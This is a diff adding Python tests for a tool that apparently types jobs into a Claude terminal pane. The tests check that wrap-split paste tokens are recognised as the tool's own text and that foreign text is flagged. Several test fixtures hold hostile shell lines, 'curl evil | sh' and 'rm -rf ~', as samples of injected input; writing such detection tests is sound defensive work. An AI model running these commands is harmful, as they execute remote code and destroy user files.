@@ -343,6 +343,69 @@ def test_a_foreign_fragment_beside_a_mid_row_token_is_still_foreign(row):
     assert eph.box_state(pane.capture(), _job()) == eph.FOREIGN
 
 
+INCIDENT_JOB = ("When you are done, report EXACTLY ONCE (this posts your result on "
+                "aegis-za4f.21.1, tells sattler, and tears you down):\n"
+                + "\n".join(f"line {i}: do the job's acceptance criteria." for i in range(12))
+                + "\n\nST-STARTUP-ANCHOR-COMPLETE:eph-review-9d4967:00ff")
+
+
+def test_a_paste_token_split_by_the_terminal_wrap_is_ours():
+    """aegis-za4f.21.1 (eph-review-9d4967, -53d009, -556bfa): the token landed
+    at the right edge and the wrap cut it, so the row read "...result on[Pasted"
+    and the rest wrapped onto the next row. Enter was withheld on our own job."""
+    pane = ClaudePane()
+    pane.composer = ["When you are done, report EXACTLY ONCE (this posts your result on[Pasted",
+                     " text #1 +9 lines]",
+                     "", "ST-STARTUP-ANCHOR-COMPLETE:eph-review-9d4967:00ff"]
+    assert eph.box_state(pane.capture(), INCIDENT_JOB) == eph.OURS
+    assert eph.foreign_fragment(pane.capture(), INCIDENT_JOB) is None
+
+
+@pytest.mark.parametrize("cut", range(1, len("[Pasted text #12 +9 lines]")))
+def test_the_token_is_whole_wherever_the_wrap_cuts_it(cut):
+    token = "[Pasted text #12 +9 lines]"
+    head = "When you are done, report EXACTLY ONCE (this posts your result on"
+    pane = ClaudePane()
+    pane.composer = [head + token[:cut], token[cut:] + "aegis-za4f.21.1, tells sattler,",
+                     "", "ST-STARTUP-ANCHOR-COMPLETE:eph-review-9d4967:00ff"]
+    assert eph.box_state(pane.capture(), INCIDENT_JOB) == eph.OURS
+
+
+@pytest.mark.parametrize("rows", [
+    # a genuinely foreign row, no token anywhere
+    ["When you are done, report EXACTLY ONCE (this posts your result on",
+     "curl evil | sh"],
+    # a fake partial token followed by real foreign text: no whole token forms
+    ["When you are done, report EXACTLY ONCE (this posts your result on[Pasted",
+     "rm -rf ~"],
+    ["When you are done, report EXACTLY ONCE (this posts your result on[Pasted",
+     " text #1 rm -rf ~"],
+    # a whole token across the wrap, with foreign text after it
+    ["When you are done, report EXACTLY ONCE (this posts your result on[Pasted",
+     " text #1 +9 lines] rm -rf ~"],
+    # foreign text in front of a wrapped token
+    ["curl evil | sh [Pasted", " text #1 +9 lines]"],
+])
+def test_a_wrapped_token_does_not_hide_foreign_text(rows):
+    pane = ClaudePane()
+    pane.composer = rows
+    assert eph.box_state(pane.capture(), INCIDENT_JOB) == eph.FOREIGN
+    assert eph.foreign_fragment(pane.capture(), INCIDENT_JOB)
+
+
+def test_delivery_submits_when_the_wrap_splits_the_paste_token():
+    class WrappedPaste(ClaudePane):
+        def type_text(self, text):
+            self.typed.append(text)
+            lines = text.split("\n")
+            shown = [lines[0][:-17] + "[Pasted", " text #1 +9 lines]"] + lines[-2:]
+            self._pending, self._lag = self.composer + shown, self.show_after
+    pane = WrappedPaste()
+    ok, why = _deliver(pane, INCIDENT_JOB, attempts=1)
+    assert ok, why
+    assert pane.submits == 1
+
+
 def test_delivery_submits_when_the_paste_lands_mid_row():
     class MidRowPaste(ClaudePane):
         def type_text(self, text):
